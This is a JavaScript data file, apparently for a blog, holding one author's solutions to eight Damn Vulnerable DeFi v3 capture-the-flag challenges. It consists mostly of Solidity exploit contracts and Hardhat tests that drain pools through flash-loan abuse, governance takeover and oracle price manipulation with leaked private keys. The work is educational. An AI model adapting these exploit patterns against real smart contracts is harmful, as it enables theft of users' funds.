export default {
    posts: [
        {
            id: "damn-vulnerable-defi-solutions-1-unstoppable",
            title: `Damn Vulnerable DeFi V3 Solutions: Unstoppable`,
            description: `My solution to 1st Damn Vulnerable DeFi v3 challenge.`,
            date: "May 30, 2023",
            snippets: [
                `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`,
                `it("Exploit", async function () {
    await token.connect(player).transfer(vault.address, 1);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-2-naive-receiver",
            title: `Damn Vulnerable DeFi V3 Solutions: Naive Receiver`,
            description: `My solution to 2nd Damn Vulnerable DeFi v3 challenge.`,
            date: "June 1, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract Exploit_NaiveReceiver {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function exploit(
        INaiveReceiverLenderPool pool,
        IERC3156FlashBorrower receiver
    ) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 1 ether, "x0");
        }
    }
}`,
                `it("Exploit", async function () {
    const attacker = await (
        await ethers.getContractFactory("Exploit_NaiveReceiver", player)
    ).deploy();

    attacker.exploit(pool.address, receiver.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-3-truster",
            title: `Damn Vulnerable DeFi V3 Solutions: Truster`,
            description: `My solution to 3rd Damn Vulnerable DeFi v3 challenge.`,
            date: "June 2, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract Exploit_Truster {
    function exploit(
        IERC20 token,
        ITrusterLenderPool pool,
        address receiver
    ) external {
        bytes memory payload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        pool.flashLoan(0, receiver, address(token), payload);

        token.transferFrom(address(pool), receiver, 1_000_000 ether);
    }
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_Truster", player)
    ).deploy();

    await attacker.exploit(token.address, pool.address, player.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-4-side-entrance",
            title: `Damn Vulnerable DeFi V3 Solutions: Side Entrance`,
            description: `My solution to 4th Damn Vulnerable DeFi v3 challenge.`,
            date: "June 3, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract Exploit_SideEntrance {
    ISideEntranceLenderPool public pool;

    constructor(ISideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function exploit(address payable receiver) external {
        // pool.flashLoan() will make a call to 'execute()' function where we exploit the contract
        pool.flashLoan(1000 ether);
        // Withdraw the credited balance to this contract
        pool.withdraw();
        // ransfer the stolen funds to attacker's EOA
        receiver.transfer(address(this).balance);
    }

    // Called by SideEntranceLenderPool::flashLoan
    function execute() public payable {
        // Return the flash loan using 'deposit()' function in the pool contract.
        // Using 'deposit()' will credit this contract with the amount of
        // returned flash loan had been taken.
        pool.deposit{value: address(this).balance}();
    }

    // This is necessary for this contract to be able to receive ETH
    receive() external payable {}
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_SideEntrance", player)
    ).deploy(pool.address);

    await attacker.exploit(player.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-5-the-rewarder",
            title: `Damn Vulnerable DeFi V3 Solutions: The Rewarder`,
            description: `My solution to 5th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 5, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITheRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract Exploit_TheRewarder {
    address attackerEOA;
    IERC20 liquidityToken;
    IERC20 rewardToken;
    ITheRewarderPool rewardPool;
    IFlashLoanerPool flashLoanPool;

    constructor(
        address _attackerEOA,
        IERC20 _liquidityToken,
        IERC20 _rewardToken,
        ITheRewarderPool _rewardPool,
        IFlashLoanerPool _flashLoanPool
    ) {
        attackerEOA = _attackerEOA;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        rewardPool = _rewardPool;
        flashLoanPool = _flashLoanPool;
    }

    function exploit() public {
        uint256 amount = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(amount);
    }

    //callback IFlashLoanerPool:flashLoan()
    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewardPool), amount);

        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        uint256 stolenReward = rewardToken.balanceOf(address(this));
        require(stolenReward > 0, "Could not steal the funds.");
        rewardToken.transfer(attackerEOA, stolenReward);
        //return the flash loan
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}`,
                `it("Exploit", async function () {
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

    attacker = await (
        await ethers.getContractFactory("Exploit_TheRewarder", player)
    ).deploy(
        player.address,
        liquidityToken.address,
        rewardToken.address,
        rewarderPool.address,
        flashLoanPool.address
    );

    await attacker.exploit();
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-6-selfie",
            title: `Damn Vulnerable DeFi V3 Solutions: Selfie`,
            description: `My solution to 6th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 6, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract Exploit_Selfie is IERC3156FlashBorrower {
    address attackerEOA;
    DamnValuableTokenSnapshot token;
    SelfiePool pool;
    SimpleGovernance governance;

    constructor(
        DamnValuableTokenSnapshot _token,
        SelfiePool _pool,
        SimpleGovernance _governance
    ) {
        attackerEOA = msg.sender;
        token = _token;
        pool = _pool;
        governance = _governance;
    }

    function exploit() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), poolBalance, "x0");
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes memory
    ) external returns (bytes32) {
        //take a snapshot because it is checked in '_hasEnoughVotes(address)'
        token.snapshot();
        //contruct a malicious tx payload
        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)",attackerEOA);
        governance.queueAction(address(pool), 0, payload);
        //approve flash loan pool so it can pull back up the amount
        token.approve(address(pool), amount);
        //return CALLBACK_SUCCESS
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_Selfie", player)
    ).deploy(token.address, pool.address, governance.address);

    await attacker.exploit();

    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

    await governance.executeAction(1); //the proposal ID is 1
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-7-compromised",
            title: `Damn Vulnerable DeFi V3 Solutions: Compromised`,
            description: `My solution to 7th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 7, 2023",
            snippets: [
                `//HTTP/2 200 OK
//content-type: text/html
//content-language: en
//vary: Accept-Encoding
//server: cloudflare

//4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
//4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34`,
                `it("Exploit", async function () {
    const signer1 = new ethers.Wallet(
        "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
        ethers.provider
    );
    const signer2 = new ethers.Wallet(
        "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
        ethers.provider
    );

    await oracle.connect(signer1).postPrice("DVNFT", 0);
    await oracle.connect(signer2).postPrice("DVNFT", 0);

    await exchange.connect(player).buyOne({value: ethers.utils.parseEther("0.01")});

    await oracle.connect(signer1).postPrice("DVNFT", ethers.utils.parseEther("999"));
    await oracle.connect(signer2).postPrice("DVNFT", ethers.utils.parseEther("999"));

    await nftToken.connect(player).approve(exchange.address, 0);
    await exchange.connect(player).sellOne(0);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-8-puppet",
            title: `Damn Vulnerable DeFi V3 Solutions: Puppet`,
            description: `My solution to 8th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 8, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./RequiredInterfaces.sol";

contract Exploit_Puppet {
    constructor(
        IERC20Permit token,
        IUniswapExchange exchange,
        ILendingPool lendingPool,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        uint256 DVTAmount = token.balanceOf(msg.sender);
        // Use the signature to approve on behalf of attackerEOA
        token.permit(
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            v,
            r,
            s
        );
        // now we can transfer the tokens from attackerEOA to this contract
        token.transferFrom(msg.sender, address(this), DVTAmount);
        // Swap the entire token balance for ETH.
        // Since the pool has little liquidity there will be a massive inbalance in price after this swap
        token.approve(address(exchange), DVTAmount);
        exchange.tokenToEthSwapInput(DVTAmount, 1, block.timestamp + 1000);
        // Required collateral is now very low (19,67 ETH) compared to needed amount before the swap.
        lendingPool.borrow{value: address(this).balance}(
            token.balanceOf(address(lendingPool)),
            msg.sender //attackerEOA
        );
    }
}
`,
                `it("Exploit", async function () {
    // Compute the address that we want to permit (attacker contract)
    const attackerAddress = ethers.utils.getContractAddress({
        from: player.address,
        nonce: 0,
    });
    // Sign the permit and return v, r, s value. Whe will pass these value to attacker contract contructor
    // and the attacker contract will use them to approve on behalf of attackerEOA
    const { r, s, v } = await signERC2612Permit(
        player,
        token.address,
        player.address,
        attackerAddress,
        ethers.constants.MaxUint256
    );
    // Deploy the attack contract with the given parameters and initilize it wiht 20 ETH
    attacker = await (
        await ethers.getContractFactory("Exploit_Puppet", player)
    ).deploy(
        token.address,
        uniswapExchange.address,
        lendingPool.address,
        v,
        r,
        s,
        { value: ethers.utils.parseEther("20") }
    );
});`,
            ],
        },
    ],
};
